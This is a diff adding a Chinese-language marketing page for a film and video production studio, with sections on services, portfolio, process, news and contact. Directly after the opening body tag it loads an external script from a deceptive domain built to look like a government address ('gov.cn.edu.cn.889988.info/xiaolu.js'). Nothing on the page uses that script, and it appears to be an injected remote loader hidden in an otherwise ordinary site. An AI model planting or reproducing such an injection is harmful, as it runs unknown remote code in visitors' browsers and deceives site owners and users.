@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视工厂 | 影视制作 · 品牌广告 · 企业宣传片 · 后期特效</title>
+<meta name="description" content="影视工厂是一家专注于品牌影视广告、企业宣传片、动画特效与影视后期制作的专业团队，以工业化流程把控每一帧画面。">
+<meta name="keywords" content="影视工厂, 影视制作, 品牌广告, 企业宣传片, 动画特效, 影视后期, 短视频营销">
+<meta name="author" content="影视工厂">
+<link rel="canonical" href="https://yingshigongchang-wap.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "影视工厂",
+  "url": "https://yingshigongchang-wap.github.io/",
+  "description": "影视工厂是一家专注于品牌影视广告、企业宣传片、动画特效与影视后期制作的专业团队。",
+  "areaServed": "CN",
+  "contactPoint": [{
+    "@type": "ContactPoint",
+    "contactType": "customer service",
+    "telephone": "+86-000-0000-0000",
+    "email": "hello@yingshigongchang-wap.github.io",
+    "availableLanguage": "zh-CN"
+  }]
+}
+</script>
+<style>
+:root{
+  --bg:#0c0d10;
+  --bg2:#14161b;
+  --line:#262a31;
+  --txt:#e9edf2;
+  --muted:#8d96a3;
+  --accent:#e6453c;
+  --accent2:#f2a03d;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);
+  color:var(--txt);
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  line-height:1.7;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1120px;margin:0 auto;padding:0 20px}
+section{padding:72px 0}
+.eyebrow{
+  font-size:12px;letter-spacing:3px;text-transform:uppercase;
+  color:var(--accent);font-weight:700;margin-bottom:12px;
+}
+.h2{
+  font-size:30px;line-height:1.3;letter-spacing:-.5px;margin-bottom:12px;
+}
+.h2 span{color:var(--accent)}
+.lead{color:var(--muted);max-width:640px}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:13px 26px;border-radius:999px;font-weight:700;font-size:15px;
+  background:var(--accent);color:#fff;border:0;cursor:pointer;transition:.25s;
+}
+.btn:hover{background:#ff5c52;transform:translateY(-2px)}
+.btn.ghost{background:transparent;border:1px solid var(--line);color:var(--txt)}
+.btn.ghost:hover{border-color:var(--accent);color:#fff}
+.tag{
+  display:inline-block;font-size:12px;padding:4px 10px;border-radius:4px;
+  background:rgba(230,69,60,.12);color:var(--accent);border:1px solid rgba(230,69,60,.3);
+}
+
+/* Header */
+header{
+  position:sticky;top:0;z-index:50;background:rgba(12,13,16,.88);
+  backdrop-filter:blur(12px);border-bottom:1px solid var(--line);
+}
+.hd-in{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{font-size:19px;font-weight:800;letter-spacing:.5px;display:flex;align-items:center;gap:9px}
+.logo i{width:26px;height:26px;border-radius:7px;background:linear-gradient(135deg,var(--accent),var(--accent2));display:grid;place-items:center;font-style:normal;font-size:13px}
+nav{display:flex;gap:6px;align-items:center}
+nav a{
+  font-size:15px;color:var(--muted);padding:8px 12px;border-radius:8px;transition:.2s;
+}
+nav a:hover{color:#fff;background:var(--bg2)}
+.hd-cta{display:none}
+@media(min-width:900px){.hd-cta{display:inline-flex}}
+.menu-btn{display:none;background:none;border:0;color:#fff;font-size:26px;cursor:pointer}
+@media(max-width:768px){
+  nav{position:fixed;top:64px;left:0;right:0;flex-direction:column;align-items:stretch;
+    background:var(--bg2);border-bottom:1px solid var(--line);padding:12px;gap:2px;
+    transform:translateY(-110%);transition:.3s;visibility:hidden}
+  nav.open{transform:translateY(0);visibility:visible}
+  nav a{padding:14px;border-radius:6px}
+  .menu-btn{display:block}
+}
+
+/* Hero */
+.hero{
+  position:relative;overflow:hidden;padding:110px 0 90px;
+  background:
+    radial-gradient(900px 400px at 85% -10%,rgba(242,160,61,.18),transparent),
+    radial-gradient(700px 400px at 5% 10%,rgba(230,69,60,.22),transparent);
+}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:60px;align-items:center}
+.hero h1{font-size:52px;line-height:1.1;letter-spacing:-1.5px;font-weight:900}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,#fff,var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--muted);font-size:17px;margin:20px 0 28px;max-width:520px}
+.hero-cta{display:flex;gap:12px;flex-wrap:wrap}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-top:46px}
+.stat{border:1px solid var(--line);border-radius:14px;padding:16px;background:rgba(255,255,255,.02)}
+.stat b{display:block;font-size:26px;letter-spacing:-1px}
+.stat span{font-size:12px;color:var(--muted)}
+/* film strip visual */
+.strip{
+  position:relative;border-radius:18px;overflow:hidden;
+  border:1px solid var(--line);background:var(--bg2);padding:14px;
+}
+.reel{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+.cell{aspect-ratio:3/4;border-radius:8px;position:relative;overflow:hidden}
+.cell::after{content:"";position:absolute;inset:0;background:linear-gradient(160deg,transparent 40%,rgba(0,0,0,.75))}
+.cell:nth-child(1){background:linear-gradient(135deg,#3a1c12,#7a2a1e)}
+.cell:nth-child(2){background:linear-gradient(135deg,#11243a,#1b4a6e)}
+.cell:nth-child(3){background:linear-gradient(135deg,#2b1f4a,#5b3a8a)}
+.cell:nth-child(4){background:linear-gradient(135deg,#3a3210,#8a7120)}
+.cell:nth-child(5){background:linear-gradient(135deg,#102a22,#1d6e56)}
+.cell:nth-child(6){background:linear-gradient(135deg,#3a1010,#8a2a2a)}
+.sprocket{
+  display:flex;justify-content:space-between;padding:9px 2px 0;
+}
+.sprocket i{
+  width:9px;height:9px;border-radius:50%;background:var(--bg);border:1px solid var(--line);font-style:normal;
+}
+@media(max-width:860px){
+  .hero{padding:70px 0 60px}.hero-grid{grid-template-columns:1fr;gap:40px}
+  .hero h1{font-size:36px}.stats{grid-template-columns:repeat(2,1fr)}
+}
+
+/* Marquee */
+.marquee{border-top:1px solid var(--line);border-bottom:1px solid var(--line);background:var(--bg2);overflow:hidden}
+.mq-track{display:flex;gap:56px;padding:20px 0;animation:slide 28s linear infinite;white-space:nowrap;color:var(--muted);font-size:14px;letter-spacing:1px}
+.mq-track span{display:flex;align-items:center;gap:10px}
+.mq-track span::before{content:"";width:6px;height:6px;border-radius:50%;background:var(--accent)}
+@keyframes slide{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* Services */
+.services{background:linear-gradient(180deg,var(--bg),var(--bg2))}
+.svc-head{display:flex;justify-content:space-between;align-items:flex-end;gap:20px;margin-bottom:40px;flex-wrap:wrap}
+.grid5{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.card{
+  border:1px solid var(--line);border-radius:16px;padding:26px;background:rgba(255,255,255,.015);
+  transition:.3s;position:relative;overflow:hidden;
+}
+.card:hover{border-color:rgba(230,69,60,.5);transform:translateY(-5px)}
+.card .ic{font-size:28px;margin-bottom:14px}
+.card h3{font-size:19px;margin-bottom:8px}
+.card p{color:var(--muted);font-size:14.5px}
+.card ul{margin-top:14px;list-style:none;display:grid;gap:7px}
+.card ul li{font-size:13.5px;color:#c4cad4;padding-left:16px;position:relative}
+.card ul li::before{content:"";position:absolute;left:0;top:9px;width:6px;height:6px;border-radius:50%;background:var(--accent)}
+@media(max-width:860px){.grid5{grid-template-columns:1fr}}
+
+/* Works */
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:28px}
+.tab{
+  font-size:14px;padding:8px 16px;border-radius:999px;border:1px solid var(--line);
+  background:transparent;color:var(--muted);cursor:pointer;transition:.2s;
+}
+.tab.on,.tab:hover{background:var(--accent);border-color:var(--accent);color:#fff}
+.works{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+.work{border:1px solid var(--line);border-radius:16px;overflow:hidden;background:var(--bg2)}
+.work .thumb{aspect-ratio:16/10;position:relative}
+.work .thumb::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 45%,rgba(0,0,0,.85))}
+.work:nth-child(1) .thumb{background:linear-gradient(120deg,#2a1a4a,#c0392b)}
+.work:nth-child(2) .thumb{background:linear-gradient(120deg,#0f3d3e,#d4a017)}
+.work:nth-child(3) .thumb{background:linear-gradient(120deg,#1b2a4a,#2980b9)}
+.work:nth-child(4) .thumb{background:linear-gradient(120deg,#3a1c0d,#e67e22)}
+.work .meta{
+  position:absolute;left:18px;right:18px;bottom:14px;z-index:2;display:flex;
+  justify-content:space-between;align-items:flex-end;gap:12px;
+}
+.work .meta b{font-size:20px}
+.work .meta span{font-size:12px;color:#ddd}
+.work .body{padding:18px 20px 20px}
+.work .body p{color:var(--muted);font-size:14px;margin-top:6px}
+.work .row{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
+.chip{font-size:12px;padding:4px 10px;border-radius:5px;border:1px solid var(--line);color:#c4cad4}
+@media(max-width:860px){.works{grid-template-columns:1fr}}
+
+/* Process */
+.proc{background:var(--bg2)}
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);border:1px solid var(--line);border-radius:16px;overflow:hidden}
+.step{background:var(--bg);padding:26px 22px;position:relative}
+.step .n{font-size:13px;font-weight:800;color:var(--accent);letter-spacing:2px}
+.step h4{font-size:17px;margin:8px 0 8px}
+.step p{font-size:13.5px;color:var(--muted)}
+@media(max-width:860px){.steps{grid-template-columns:1fr 1fr}}
+
+/* News */
+.news-list{display:grid;gap:0;border:1px solid var(--line);border-radius:16px;overflow:hidden}
+.news-item{
+  display:grid;grid-template-columns:120px 1fr auto;gap:22px;align-items:center;
+  padding:20px 22px;border-bottom:1px solid var(--line);transition:.2s;
+}
+.news-item:last-child{border-bottom:0}
+.news-item:hover{background:rgba(230,69,60,.06)}
+.news-item time{font-size:13px;color:var(--accent);font-weight:700;letter-spacing:1px}
+.news-item h4{font-size:16px}
+.news-item h4 small{display:block;font-size:13px;color:var(--muted);font-weight:400;margin-top:3px}
+.news-item .go{color:var(--muted);font-size:20px;transition:.2s}
+.news-item:hover .go{color:var(--accent);transform:translateX(4px)}
+@media(max-width:700px){.news-item{grid-template-columns:1fr;gap:8px}.news-item .go{display:none}}
+
+/* Contact */
+.cta-box{
+  border-radius:20px;padding:52px 44px;border:1px solid var(--line);
+  background:
+    radial-gradient(600px 260px at 90% 0%,rgba(230,69,60,.25),transparent),
+    var(--bg2);
+  display:grid;grid-template-columns:1.2fr .8fr;gap:40px;align-items:center;
+}
+.cta-box h2{font-size:32px;line-height:1.25;margin:10px 0 14px}
+.cta-box p{color:var(--muted);margin-bottom:22px}
+.info{display:grid;gap:14px}
+.info div{border:1px solid var(--line);border-radius:12px;padding:14px 16px;background:rgba(0,0,0,.25)}
+.info dt{font-size:12px;color:var(--accent);letter-spacing:1px;margin-bottom:3px}
+.info dd{font-size:15px}
+@media(max-width:860px){.cta-box{grid-template-columns:1fr;padding:36px 24px}}
+
+footer{border-top:1px solid var(--line);padding:36px 0 44px;color:var(--muted);font-size:13.5px}
+.ft{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.ft-links{display:flex;gap:20px;flex-wrap:wrap}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap hd-in">
+    <a href="#" class="logo"><i>影</i>影视工厂</a>
+    <nav id="nav">
+      <a href="#home">首页</a>
+      <a href="#services">服务</a>
+      <a href="#works">作品</a>
+      <a href="#process">流程</a>
+      <a href="#news">动态</a>
+      <a href="#contact">联系</a>
+      <a href="#" class="btn" style="margin-left:6px">预约洽谈</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- HERO -->
+<section class="hero" id="home">
+  <div class="wrap hero-grid">
+    <div>
+      <div class="tag">FILM & VIDEO PRODUCTION STUDIO · 2014—2026</div>
+      <h1 style="margin-top:16px">工厂造光影，<br><em>帧帧皆精品。</em></h1>
+      <p>影视工厂以工业化生产标准与匠心创作精神，为品牌与企业提供从策略创意到拍摄、动画特效、后期调色的一站式影视内容解决方案。</p>
+      <div class="hero-cta">
+        <a href="#works" class="btn">查看作品 →</a>
+        <a href="#contact" class="btn ghost">预约项目咨询</a>
+      </div>
+      <div class="stats">
+        <div class="stat"><b>200+</b><span>精品影视作品</span></div>
+        <div class="stat"><b>12</b><span>年行业沉淀</span></div>
+        <div class="stat"><b>50+</b><span>签约创作人</span></div>
+        <div class="stat"><b>98%</b><span>客户复购率</span></div>
+      </div>
+    </div>
+    <div class="strip">
+      <div class="reel">
+        <div class="cell"></div><div class="cell"></div><div class="cell"></div>
+        <div class="cell"></div><div class="cell"></div><div class="cell"></div>
+      </div>
+      <div class="sprocket">
+        <i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="marquee"><div class="mq-track">
+  <span>SONY VENICE 2 · 8K</span><span>ARRI ALEXA 35</span><span>DJI INSPIRE 3 · 航拍</span>
+  <span>DaVinci RESOLVE · 调色棚</span><span>虚幻引擎 · 虚拟制片</span><span>杜比 5.1 · 混音棚</span>
+  <span>SONY VENICE 2 · 8K</span><span>ARRI ALEXA 35</span><span>DJI INSPIRE 3 · 航拍</span>
+  <span>DaVinci RESOLVE · 调色棚</span><span>虚幻引擎 · 虚拟制片</span><span>杜比 5.1 · 混音棚</span>
+</div></div>
+
+<!-- SERVICES -->
+<section id="services">
+  <div class="wrap">
+    <div class="svc-head">
+      <div>
+        <div class="eyebrow">Our Services</div>
+        <h2 class="h2">五大业务板块，<span>全链路协同</span></h2>
+        <p class="lead">从需求洞察到成片交付，每个环节都由对应领域的资深团队把控，让商业内容同时具备传播力与艺术质感。</p>
+      </div>
+      <a href="#contact" class="btn ghost">索取服务报价</a>
+    </div>
+
+    <div class="grid5">
+      <article class="card">
+        <div class="ic">🎬</div>
+        <h3>品牌影视广告</h3>
+        <p>策略创意到拍摄制作全链路把控，打造强传播力的品牌 TVC 与数字广告影片。</p>
+        <ul><li>品牌 TVC / 形象片</li><li>产品广告 / 功能短片</li><li>社交媒体传播素材</li></ul>
+      </article>
+
+      <article class="card">
+        <div class="ic">🎞️</div>
+        <h3>企业宣传片</h3>
+        <p>深度挖掘企业价值内核，以叙事化影像构建品牌故事，赋能企业形象升级。</p>
+        <ul><li>企业形象 / 文化片</li><li>招商路演 / 融资片</li><li>园区与基地介绍片</li></ul>
+      </article>
+
+      <article class="card">
+        <div class="ic">✨</div>
+        <h3>动画特效制作</h3>
+        <p>三维动画、CGI 合成与视觉特效渲染，工业化流程确保每一帧的视觉震撼力。</p>
+        <ul><li>三维产品动画</li><li>MG 动画 / 信息可视化</li><li>CGI 合成与虚拟场景</li></ul>
+      </article>
+
+      <article class="card">
+        <div class="ic">🚀</div>
+        <h3>短视频营销</h3>
+        <p>深谙平台流量算法与用户偏好，策划高转化短视频创意，搭建全域传播矩阵。</p>
+        <ul><li>抖音 / 视频号内容</li><li>直播切片与二次创作</li><li>KOL 联名内容</li></ul>
+      </article>
+
+      <article class="card">
+        <div class="ic">🎧</div>
+        <h3>影视后期制作</h3>
+        <p>剪辑、调色、混音、字幕包装一站式服务，让原始素材焕发专业级视听表达。</p>
+        <ul><li>剪辑与节奏重塑</li><li>DaVinci 调色</li><li>混音 / 字幕 / 包装</li></ul>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- WORKS -->
+<section id="works" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="eyebrow">Selected Works</div>
+    <h2 class="h2">精品力作 · <span>作品库</span></h2>
+    <p class="lead" style="margin-bottom:22px">涵盖汽车、消费、科技、文旅、政务等多行业，以下是近期代表性项目。</p>
+
+    <div class="tabs">
+      <button class="tab on">全部</button>
+      <button class="tab">品牌广告</button>
+      <button class="tab">企业宣传片</button>
+      <button class="tab">动画特效</button>
+      <button class="tab">短视频</button>
+    </div>
+
+    <div class="works">
+      <article class="work">
+        <div class="thumb"><div class="meta"><b>长河落日</b><span>历史 · 剧情</span></div></div>
+        <div class="body">
+          <p>历时 18 个月打磨的品牌级影视短片，以宏大叙事与震撼视觉呈现家国情怀。</p>
+          <div class="row"><span class="chip">导演组</span><span class="chip">实拍</span><span class="chip">调色</span></div>
+        </div>
+      </article>
+
+      <article class="work">
+        <div class="thumb"><div class="meta"><b>星辰大海</b><span>科幻 · 冒险</span></div></div>
+        <div class="body">
+          <p>以虚幻引擎驱动虚拟制片，完成高难度太空场景与视效镜头的工业化交付。</p>
+          <div class="row"><span class="chip">虚拟制片</span><span class="chip">CGI</span><span class="chip">混音</span></div>
+        </div>
+      </article>
+
+      <article class="work">
+        <div class="thumb"><div class="meta"><b>东方传奇</b><span>古装 · 武侠</span></div></div>
+        <div class="body">
+          <p>为文旅项目定制的沉浸式视觉内容，融合实拍与三维场景重建。</p>
+          <div class="row"><span class="chip">文旅</span><span class="chip">三维重建</span><span class="chip">全案</span></div>
+        </div>
+      </article>
+
+      <article class="work">
+        <div class="thumb"><div class="meta"><b>花开时节</b><span>爱情 · 文艺</span></div></div>
+        <div class="body">
+          <p>轻量高效的品牌故事短片，用克制的视听语言传递品牌温度与调性。</p>
+          <div class="row"><span class="chip">品牌</span><span class="chip">微电影</span><span class="chip">剪辑</span></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- PROCESS -->
+<section id="process">
+  <div class="wrap">
+    <div class="eyebrow">How We Work</div>
+    <h2 class="h2">服务流程 · <span>四大节点清晰透明</span></h2>
+    <p class="lead" style="margin-bottom:36px">每个项目都在可控节奏中推进，关键节点同步确认，避免返工与沟通损耗。</p>
+
+    <div class="steps">
+      <div class="step"><div class="n">STEP 01</div><h4>需求分析</h4><p>了解品牌目标与核心受众，梳理传播诉求与内容策略。</p></div>
+      <div class="step"><div class="n">STEP 02</div><h4>创意提案</h4><p>输出脚本、分镜与视觉方案，多版本比选后锁定方向。</p></div>
+      <div class="step"><div class="n">STEP 03</div><h4>拍摄执行</h4><p>导演组、摄影、灯光、美术协同，现场实时监看与调度。</p></div>
+      <div class="step"><div class="n">STEP 04</div><h4>后期交付</h4><p>剪辑、调色、混音、包装多版本输出，适配各投放渠道。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- NEWS -->
+<section id="news" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="svc-head">
+      <div>
+        <div class="eyebrow">News &amp; Insights</div>
+        <h2 class="h2">行业动态 · <span>项目资讯</span></h2>
+      </div>
+      <a href="#" class="btn ghost">全部资讯</a>
+    </div>
+
+    <div class="news-list">
+      <a href="#" class="news-item">
+        <time>2026.04.01</time>
+        <h4>《长河落日》正式杀青，品牌级短片即将上线<small>历时 18 个月精心打磨，汇聚国内资深创作阵容。</small></h4>
+        <span class="go">→</span>
+      </a>
+      <a href="#" class="news-item">
+        <time>2026.03.18</time>
+        <h4>影视工厂完成虚拟制片棚二期升级<small>新增 LED 环幕与实时引擎节点，提升虚拟拍摄效率。</small></h4>
+        <span class="go">→</span>
+      </a>
+      <a href="#" class="news-item">
+        <time>2026.03.05</time>
+        <h4>与国内流媒体平台达成内容合作<small>多部精品短片与系列内容面向平台用户播出。</small></h4>
+        <span class="go">→</span>
+      </a>
+      <a href="#" class="news-item">
+        <time>2026.02.20</time>
+        <h4>2026 年度作品片单发布<small>12 部重磅作品亮相，覆盖品牌广告与文旅内容。</small></h4>
+        <span class="go">→</span>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- CONTACT -->
+<section id="contact">
+  <div class="wrap">
+    <div class="cta-box">
+      <div>
+        <div class="tag">Let's shoot</div>
+        <h2>把你的品牌故事，<br>交给一支专业的团队。</h2>
+        <p>提交需求后 24 小时内，我们将安排制片与你对接，评估预算、档期与内容方向。</p>
+        <div style="display:flex;gap:12px;flex-wrap:wrap">
+          <a href="#" class="btn">预约洽谈</a>
+          <a href="#" class="btn ghost">下载公司介绍</a>
+        </div>
+      </div>
+      <dl class="info">
+        <div><dt>电话 / TEL</dt><dd>+86 000 0000 0000</dd></div>
+        <div><dt>邮箱 / EMAIL</dt><dd>hello@yingshigongchang-wap.github.io</dd></div>
+        <div><dt>地址 / STUDIO</dt><dd>北京市朝阳区影视产业园 A 座 3F</dd></div>
+        <div><dt>工作时间</dt><dd>周一至周六 09:30 — 19:00</dd></div>
+      </dl>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap ft">
+    <div>
+      <div class="logo" style="margin-bottom:8px"><i>影</i>影视工厂</div>
+      <div>© 2014—2026 影视工厂（影视制作工作室） · 工厂造光影，帧帧皆精品</div>
+    </div>
+    <div class="ft-links">
+      <a href="#home">首页</a>
+      <a href="#services">服务</a>
+      <a href="#works">作品</a>
+      <a href="#process">流程</a>
+      <a href="#contact">联系</a>
+      <a href="#">隐私政策</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('menuBtn').addEventListener('click',function(){
+  document.getElementById('nav').classList.toggle('open');
+});
+document.querySelectorAll('nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});
+});
+document.querySelectorAll('.tab').forEach(function(t){
+  t.addEventListener('click',function(){
+    document.querySelectorAll('.tab').forEach(function(x){x.classList.remove('on');});
+    t.classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
